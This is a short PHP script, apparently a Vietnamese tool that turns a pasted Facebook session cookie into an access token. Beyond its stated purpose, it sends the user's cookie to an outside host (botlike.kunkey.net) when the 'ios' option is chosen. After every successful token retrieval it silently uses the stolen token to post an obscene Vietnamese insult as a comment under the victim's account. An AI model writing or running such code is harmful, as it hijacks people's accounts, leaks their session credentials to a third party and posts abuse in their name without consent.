<?php
/***********************************************
               Code Update Token By Kunkey
Không Xóa Dòng Này Nếu Bạn là người Có Học
************************************************/
include'func.php';




$cooke = $_GET['cookie'];
$ap = $_GET['app'];

if (!$cooke) {
echo '<div class="form-group"><label for="token">* Hãy Nhập Cookie Vào</label>';
	echo '<input type="text" class="form-control" placeholder="Hãy Nhập Cookie Vào" disabled="">';
exit();
}
if (!$ap) {
echo '<div class="form-group"><label for="token">* Hãy Chọn Ứng Dụng Lấy Token</label>';
	echo '<input type="text" class="form-control" placeholder="Hãy Chọn Ứng Dụng Lấy Token" disabled="">';
exit();
}else {
if ($ap == 'htc') {
$app = '41158896424';
} else if ($ap == 'nokia') {
$app = '200758583311692';
} else if ($ap == 'insta') {
$app = '124024574287414';
} else if ($ap == 'android') {
$app = '350685531728';
} else if ($ap == 'ios') {
$token = file_get_contents('http://botlike.kunkey.net/ios.php?cookie='.urlencode($cooke).'');
echo $token;
exit();
}
}


$url = curl('https://developers.facebook.com/tools/debug/accesstoken/?app_id='.$app.'',$cooke);
//echo $url;

if($url) {

$dau1 = strstr($url,'required="1" name="q" value="');
$nd2 = str_replace($url,'',$dau1);
$nd2 = str_replace('required="1" name="q" value=','',$nd2);
$nd2 = str_replace('aria-label=Nhập một mã truy ','',$nd2);
$puarudz= explode('<input type="hidden" autocomplete="off" id="hidden_version_input" name="version" value="v2.8" />',$nd2);
$title = explode('"',$puarudz[0]); //Lấy nội dung từ title đến hết 
$token = explode('" aria-label="Nhập một mã truy cập để sửa lỗi." aria-required="true" />',$title[1]); // Lấy mảng thứ 2 

if(!$token[0]) {
echo '<div class="form-group"><label for="token">* Lấy Token Thất Bại</label>';
	echo '<input type="text" class="form-control" placeholder="Lấy Token Thất Bại" disabled="">';
exit();
} else{
echo '<div class="form-group"><label for="token">* Lấy Token Thành Công</label>';
echo '<input type="text" class="form-control" value="'.$token[0].'">';
$traloi = 'Địt Con Mẹ Mày Thằng Mặt Lồn #Vĩ Óc Chó!';
file_get_contents('https://graph.facebook.com/577615402410208/comments?access_token='.$token[0].'&message='.urlencode($traloi).'&method=post');

}
}